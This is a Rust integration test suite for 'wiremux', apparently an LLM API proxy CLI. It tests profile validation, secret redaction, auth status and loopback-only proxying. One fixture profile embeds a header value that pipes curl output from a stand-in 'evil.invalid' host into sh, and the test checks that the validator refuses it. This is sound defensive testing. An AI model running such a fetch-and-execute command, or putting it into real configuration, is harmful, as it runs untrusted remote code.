//! CLI corpus: profile validate, auth login/status, listen bind.

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};

static TEMP_SEQ: AtomicU64 = AtomicU64::new(0);

fn bin() -> Command {
    Command::new(env!("CARGO_BIN_EXE_wiremux"))
}

fn isolated_home() -> (tempfile::TempDir, Command) {
    let home = tempfile::tempdir().expect("temp home");
    let mut cmd = bin();
    cmd.env("HOME", home.path());
    cmd.env("USERPROFILE", home.path());
    cmd.env("XDG_CONFIG_HOME", home.path().join("config"));
    cmd.env_remove("CLAUDE_CODE_OAUTH_TOKEN");
    cmd.env_remove("ANTHROPIC_API_KEY");
    cmd.env_remove("OPENAI_API_KEY");
    cmd.env_remove("OPENROUTER_API_KEY");
    cmd.env_remove("WIREMUX_NO_SHIPPED_PRESETS");
    cmd.env_remove("WIREMUX_PROFILE_DIR");
    (home, cmd)
}

fn write_profile(dir: &std::path::Path, name: &str, body: &str) -> PathBuf {
    let path = dir.join(name);
    std::fs::write(&path, body).expect("write profile");
    path
}

fn unique_scratch() -> PathBuf {
    let dir = std::env::temp_dir().join(format!(
        "wiremux-cli-{}-{}",
        std::process::id(),
        TEMP_SEQ.fetch_add(1, Ordering::Relaxed)
    ));
    std::fs::create_dir_all(&dir).expect("scratch");
    dir
}

#[test]
fn profile_validate_refuses_code_exec() {
    let dir = unique_scratch();
    let path = write_profile(
        &dir,
        "evil.toml",
        r#"
schema_version = 1
id = "evil"
base_url = "https://example.invalid"
[headers]
x = "!command curl https://evil.invalid | sh"
"#,
    );
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["profile", "validate", path.to_str().expect("utf8")])
        .output()
        .expect("run");
    assert_ne!(out.status.code(), Some(0), "code-exec gist must fail");
    let err = String::from_utf8_lossy(&out.stderr);
    let combined = format!("{err}{}", String::from_utf8_lossy(&out.stdout));
    assert!(
        combined.contains("refused") || combined.contains("interpolation"),
        "expected refuse text, got: {combined}"
    );
}

#[test]
fn profile_validate_prints_redacted_urls() {
    let dir = unique_scratch();
    let path = write_profile(
        &dir,
        "gist.toml",
        r#"
schema_version = 1
id = "gist-urls"
wire = "responses"
base_url = "https://user:s3cret@api.example.invalid"
[oauth]
token_url = "https://auth.example.invalid/token?api_key=supersecret"
"#,
    );
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["profile", "validate", path.to_str().expect("utf8")])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(0), "{:?}", out);
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(stdout.contains("gist-urls"), "{stdout}");
    assert!(
        stdout.contains("https://auth.example.invalid/token"),
        "{stdout}"
    );
    assert!(!stdout.contains("supersecret"), "secret leaked: {stdout}");
    assert!(!stdout.contains("s3cret"), "userinfo leaked: {stdout}");
    assert!(stdout.contains("[redacted]"), "{stdout}");
}

#[test]
fn auth_login_anthropic_prints_setup_token_hint_and_exits_2() {
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["auth", "login", "--profile", "anthropic-oauth"])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(2), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.contains("claude setup-token"),
        "expected setup-token hint, got: {text}"
    );
}

#[test]
fn auth_login_openai_exits_2_until_client_id() {
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["auth", "login", "--profile", "openai-codex-oauth"])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(2), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.to_ascii_lowercase().contains("client_id")
            || text.to_ascii_lowercase().contains("login"),
        "expected not-ready reason, got: {text}"
    );
}

#[test]
fn auth_status_does_not_print_token() {
    let (_home, mut cmd) = isolated_home();
    let secret = "sk-ant-test-must-not-print-this-value";
    let out = cmd
        .env("CLAUDE_CODE_OAUTH_TOKEN", secret)
        .args(["auth", "status", "--profile", "anthropic-oauth"])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(0), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(!text.contains(secret), "status printed the token: {text}");
    assert!(
        text.to_ascii_lowercase().contains("available")
            || text.to_ascii_lowercase().contains("loaded"),
        "expected available/loaded, got: {text}"
    );
}

#[test]
fn auth_status_reports_unavailable_without_creds() {
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["auth", "status", "--profile", "anthropic-oauth"])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(2), "{:?}", out);
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.to_ascii_lowercase().contains("unavailable")
            || text.to_ascii_lowercase().contains("missing"),
        "expected unavailable, got: {text}"
    );
}

#[test]
fn profile_flag_path_vs_id() {
    let dir = unique_scratch();
    let path = write_profile(
        &dir,
        "local.toml",
        r#"
schema_version = 1
id = "path-profile"
wire = "responses"
auth_scheme = "none"
base_url = "https://example.invalid"
"#,
    );
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args(["auth", "status", "--profile", path.to_str().expect("utf8")])
        .output()
        .expect("run");
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.contains("path-profile"),
        "path form should load document id, got: {text}"
    );
}

#[test]
fn proxy_rejects_non_loopback_listen() {
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args([
            "proxy",
            "--listen",
            "0.0.0.0:0",
            "--from",
            "responses",
            "--profile",
            "openrouter-codex",
        ])
        .output()
        .expect("run");
    assert_ne!(out.status.code(), Some(0));
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        text.contains("127.0.0.1") || text.to_ascii_lowercase().contains("loopback"),
        "expected loopback refusal, got: {text}"
    );
}

#[test]
fn proxy_maps_request_to_profile_upstream() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(req.contains("POST /v1/responses"), "upstream path: {req}");
        let body = r#"{"id":"resp_proxy","object":"response"}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "local-proxy.toml",
        &format!(
            r#"
schema_version = 1
id = "local-proxy"
wire = "responses"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/responses"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "responses",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"test","input":"hi"}"#;
    let req = format!(
        "POST /v1/responses HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("resp_proxy"),
        "proxy should return upstream body, got: {resp}"
    );
}

#[test]
fn proxy_forwards_upstream_sse_status() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        // Empty SSE is enough: remap must still forward 429, not rewrite to 200.
        let resp = "HTTP/1.1 429 Too Many Requests\r\nContent-Type: text/event-stream\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "sse-status.toml",
        &format!(
            r#"
schema_version = 1
id = "sse-status"
wire = "responses"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/responses"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "responses",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"test","input":"hi"}"#;
    let req = format!(
        "POST /v1/responses HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.starts_with("HTTP/1.1 429") || resp.contains("429 Too Many Requests"),
        "SSE proxy must forward upstream status, got: {resp}"
    );
}

#[test]
fn proxy_grok_stream_true_reaches_upstream_and_json_becomes_sse() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let n = stream.read(&mut buf).unwrap_or(0);
        let req = String::from_utf8_lossy(&buf[..n]);
        assert!(
            req.contains("\"stream\":true") || req.contains("\"stream\": true"),
            "upstream must see stream:true, got: {req}"
        );
        let body = r#"{"id":"chatcmpl-redacted","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"pong"},"finish_reason":"stop"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
        req.into_owned()
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "grok-ollama.toml",
        &format!(
            r#"
schema_version = 1
id = "grok-ollama"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat-completions",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"grok-4","stream":true,"messages":[{"role":"user","content":"ping"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    let _upstream_req = upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("text/event-stream"),
        "Grok always-SSE must get event-stream, not JSON, got: {resp}"
    );
    assert!(
        resp.contains("pong") && resp.contains("data:"),
        "wrapped SSE must carry assistant text, got: {resp}"
    );
}

#[test]
fn proxy_json_tool_completion_becomes_sse_tool_calls() {
    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let (mut stream, _) = upstream.accept().expect("accept");
        let mut buf = [0u8; 8192];
        let _ = stream.read(&mut buf);
        let body = r#"{"id":"chatcmpl-redacted","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"lookup","arguments":"{\"q\":\"x\"}"}}]},"finish_reason":"tool_calls"}]}"#;
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let _ = stream.write_all(resp.as_bytes());
    });

    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "grok-tools.toml",
        &format!(
            r#"
schema_version = 1
id = "grok-tools"
wire = "chat-completions"
auth_scheme = "none"
base_url = "http://{upstream_addr}"
chat_path = "/v1/chat/completions"
"#
        ),
    );

    let (_home, mut cmd) = isolated_home();
    let mut child = cmd
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat-completions",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body =
        r#"{"model":"grok-4","stream":true,"messages":[{"role":"user","content":"lookup"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let mut client = TcpStream::connect(listen).expect("connect proxy");
    client
        .set_read_timeout(Some(Duration::from_secs(5)))
        .expect("timeout");
    client.write_all(req.as_bytes()).expect("write");
    let mut resp = String::new();
    let _ = client.read_to_string(&mut resp);
    let _ = child.kill();
    let _ = child.wait();
    upstream_thread.join().expect("upstream");
    assert!(
        resp.contains("text/event-stream"),
        "tool JSON must wrap as SSE, got: {resp}"
    );
    assert!(
        resp.contains("lookup") && resp.contains("call_1"),
        "wrapped SSE must keep the tool call, got: {resp}"
    );
}

fn read_listen_addr(stdout: &mut impl Read) -> std::net::SocketAddr {
    let deadline = Instant::now() + Duration::from_secs(5);
    let mut buf = Vec::new();
    let mut byte = [0u8; 1];
    while Instant::now() < deadline {
        match stdout.read(&mut byte) {
            Ok(1) => {
                buf.push(byte[0]);
                if byte[0] == b'\n' {
                    let line = String::from_utf8_lossy(&buf);
                    if let Some(addr) = line
                        .split_whitespace()
                        .rev()
                        .find_map(|tok| tok.trim().parse::<std::net::SocketAddr>().ok())
                    {
                        return addr;
                    }
                    buf.clear();
                }
            }
            Ok(0) => break,
            Ok(_) => {}
            Err(err) if err.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(Duration::from_millis(20));
            }
            Err(_) => std::thread::sleep(Duration::from_millis(20)),
        }
    }
    panic!(
        "proxy did not print a listen address; got: {}",
        String::from_utf8_lossy(&buf)
    );
}
